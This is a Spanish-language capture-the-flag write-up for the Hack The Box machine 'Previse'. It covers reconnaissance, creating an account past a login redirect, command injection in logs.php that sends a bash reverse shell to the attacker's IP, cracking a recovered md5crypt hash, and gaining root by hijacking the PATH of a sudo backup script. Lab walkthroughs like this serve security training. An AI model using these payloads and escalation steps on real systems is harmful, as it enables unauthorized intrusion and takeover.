

# WriteUp - Previse (Linux) ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/common-images/linux.jpg?raw=true "Linux")  - Español
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/logo.jpg "Previse")

Creador de la máquina: **m4lwhere**

### Writeup por Tnr1112

## Tabla de contenidos

<!-- TOC -->

- [WriteUp - Previse (Linux) - Español](#writeup---previse-linux--español)
    - [Tabla de contenidos](#tabla-de-contenidos)
    - [Enumeración](#enumeración)
        - [Empezamos escaneando todos los puertos abiertos](#empezamos-escaneando-todos-los-puertos-abiertos)
        - [Buscamos los servicios que corren los puertos abiertos](#buscamos-los-servicios-que-corren-los-puertos-abiertos)
        - [Web](#web)
        - [Fuzzing](#fuzzing)
        - [Web después de enumerar](#web-después-de-enumerar)
            - [Burpsuite](#burpsuite)
        - [RCE](#rce)
		- [Escalada de privilegios](#escalada-de-privilegios)
			- [Injección PATH](#injección-path)
<!-- /TOC -->

## Enumeración
### Empezamos escaneando todos los puertos abiertos
```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.11.104 -oG allPorts
```
Lo exporto en modo grepeable para después poder utilizar una función que me extrae los puertos

|PORT|STATE|SERVICE| 
|--|--|--|
|22/tcp|open|ssh|
|80/tcp|open|http|

### Buscamos los servicios que corren los puertos abiertos

```bash
nmap -sC -sV -p22,80 10.10.11.104 -oN targeted
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web
En la página web, tenemos un login. Pruebo inyecciones SQL, pero no hay nada, lo mismo pasa con las credenciales por defecto.
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/login.jpg "Login")

### Fuzzing
Utilizamos `wfuzz` para enumerar algún directorio, pero no hay nada interesante.
```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 http://10.10.11.104/FUZZ/
```

Ahora enumeramos los subdominios.
```bash
wfuzz -c --hc=404 --hl=12 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.10.10.11.104" -t 200 http://10.10.11.104
```
Nada interesante :/
<br>

Como sabemos que en el server usa archivos .php, vamos a fuzzear cualquier archivo que sea `.php`

```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -f phpFuzz http://10.10.11.104/FUZZ.php
```
```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.104/FUZZ.php
Total requests: 220641

=====================================================================
ID           Response   Lines    Word       Chars       Payload    
=====================================================================

000000024:   403        9 L      28 W       277 Ch      ".htaccess"
000000025:   403        9 L      28 W       277 Ch      ".htpasswd"
000000023:   403        9 L      28 W       277 Ch      ".hta"     
000000281:   200        31 L     60 W       1248 Ch     "nav"     
000000272:   200        20 L     64 W       980 Ch      "header"   
000000414:   200        5 L      14 W       217 Ch      "footer"   
000000098:   302        0 L      0 W        0 Ch        "download" 
000000096:   302        71 L     164 W      2801 Ch     "index"    
000000134:   200        53 L     138 W      2224 Ch     "login"    
000000845:   302        74 L     176 W      2968 Ch     "status"   
000001306:   302        0 L      0 W        0 Ch        "logout"   
000001470:   302        93 L     238 W      3994 Ch     "accounts" 
000001571:   200        0 L      0 W        0 Ch        "config"   
000002352:   302        0 L      0 W        0 Ch        "logs"     
000000175:   302        112 L    263 W      4914 Ch     "files"
```

Encuentra varios archivos. Vamos a ver el `nav.php`.

### Web después de enumerar
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/nav.jpg "Nav")
Vemos que existe una ruta de `accounts.php` para crear una cuenta.
Pero al entrar a esa URL, nos redirige al login.
Vamos a interceptar la petición con el **Burpsuite**.

### Burpsuite

![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/accountsGET.jpg "AccountsGET")
Vemos que en la página hay un formulario con el campo `username`, `password` y `confirm` que hace una petición por POST a la misma página para generar el usuario. Vamos a realizar esa petición.

```POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

username=Tnr1112&password=lalala&confirm=lalala
```
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/accountsPOST.jpg "AccountsPOST")

Como vemos, dice _Success! User was added!_, así que resta loguearnos con esta cuenta para ingresar al archivo _files.php_

![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/files.jpg "Files")

Vamos a descargar el _SITEBACKUP.zip_
```bash
drwxr-xr-x root    root     286 B  Tue Jan 25 10:46:12 2022  .
drwxr-xr-x root    root      52 B  Tue Jan 25 10:03:44 2022  ..
.rw-r--r-- root    root     5.6 KB Sat Jun 12 08:04:45 2021  accounts.php
.rw-r--r-- root    root     208 B  Sat Jun 12 08:07:09 2021  config.php
.rw-r--r-- root    root     1.5 KB Wed Jun  9 09:57:57 2021  download.php
.rw-r--r-- root    root     1.2 KB Sat Jun 12 08:10:16 2021  file_logs.php
.rw-r--r-- root    root     6.0 KB Wed Jun  9 09:51:48 2021  files.php
.rw-r--r-- root    root     217 B  Thu Jun  3 07:00:53 2021  footer.php
.rw-r--r-- root    root    1012 B  Sat Jun  5 22:56:20 2021  header.php
.rw-r--r-- root    root     551 B  Sat Jun  5 23:00:14 2021  index.php
.rw-r--r-- root    root     2.9 KB Sat Jun 12 08:06:21 2021  login.php
.rw-r--r-- root    root     190 B  Tue Jun  8 13:42:56 2021  logout.php
.rw-r--r-- root    root     1.1 KB Wed Jun  9 09:58:41 2021  logs.php
.rw-r--r-- root    root     1.2 KB Sat Jun  5 16:31:05 2021  nav.php
.rw-r--r-- root    root     9.7 KB Tue Jan 25 10:45:13 2022  siteBackup.zip
.rw-r--r-- root    root     1.9 KB Wed Jun  9 09:40:24 2021  status.php
```
Hay varios archivos, vamos a entrar al _config.php_

![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/configFile.jpg "ConfigFile")

Hay credenciales de base de datos, nos pueden servir para después.

En el archivo _logs.php_, vemos que en la línea 19 por medio de la función `exec` con python ejecuta el archivo `/opt/scripts/log_process.py` en el cual, por el parámetro _POST_, le podemos ingresar un valor y en su defecto, un comando a ejecutar.
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/logsFile.jpg "LogsFile")

Esta es la página:
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/file_logs.jpg "file_logs")

## RCE
Vamos a interceptar la petición con **Burpsuite** para modificarla.
Con este payload, vamos a obtener una reverse shell hacia nuestra computadora.
```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=cj47bms58h1t5pnp75i0ecbgnb
Upgrade-Insecure-Requests: 1

delim=comma%26/bin/bash+-c+'bash+-i+>+/dev/tcp/10.10.14.185/4444+0>%261'
```
Y efectivamente, somos _www-data_

![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/revShell.jpg "RevShell")

Ahora vamos a revisar la base de datos con las credenciales que encontramos anteriormente.
`myqsl -uroot -pmySQL_p@ssw0rd\!\:\)`

Vemos que hay una tabla de `accounts` con el usuario _m4lwhere_ y una contraseña hasheada.

![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/database.jpg "Database")

Para identificar el tipo de hash, vamos a ejecutar `hashcat --example-hashes | grep '\$1' -B4`
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/hashIdentifier.jpg "HashIdentifier")
Vemos que es md5crypt y que es el modo 500 para hashcat.
Por medio de fuerza bruta con hashcat y con el diccionario _rockyou_, vamos a obtener la contraseña del usuario _m4lwhere_
```hashcat -a 0 -m 500 hashM4lwhere /usr/share/wordlists/rockyou.txt```
_$1\$🧂llol$DQpmdvnb7EeuO6UaqRItf._:_ilovecody112235!_

Ahora por **ssh** vamos a loguearnos como _m4lwhere_ con la contraseña _ilovecody112235!_ y obtendremos la flag de **user**.
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/userFlag.jpg "UserFlag")

## Escalada de privilegios

En el directorio `/opt/scripts` encontramos un archivo llamado `access_backup.sh`, el cual podemos ejecutar como root.

```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
Vemos que ejecuta el comando de `gzip` y de `date`. Lo que podemos hacer es cambiar el código que ejecutan esos comandos.
```bash
m4lwhere@previse:~$ which gzip
/bin/gzip
```
Vemos que gzip se encuentra en `/bin/gzip`, si nosotros podemos cambiar el lugar de dónde ejecuta este comando, vamos a poder escribir el código que queramos.

### Injección PATH
Lo que podemos hacer es editar el _PATH_ del comando gzip para que el programa que vea el entorno sea nuestra versión y no la correcta.
`export PATH=:/home/m4lwhere:$PATH`

Creamos una bash en el gzip que tomará el _PATH_

`echo "/bin/bash" > /home/m4lwhere/gzip`

Le damos permisos.

`chmod 777 /home/m4lwhere/gzip`

Lo ejecutamos.

`sudo /opt/scripts/access_backup.sh`

Y obtenemos una **shell** como **root** :)

![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/root.jpg "Root")
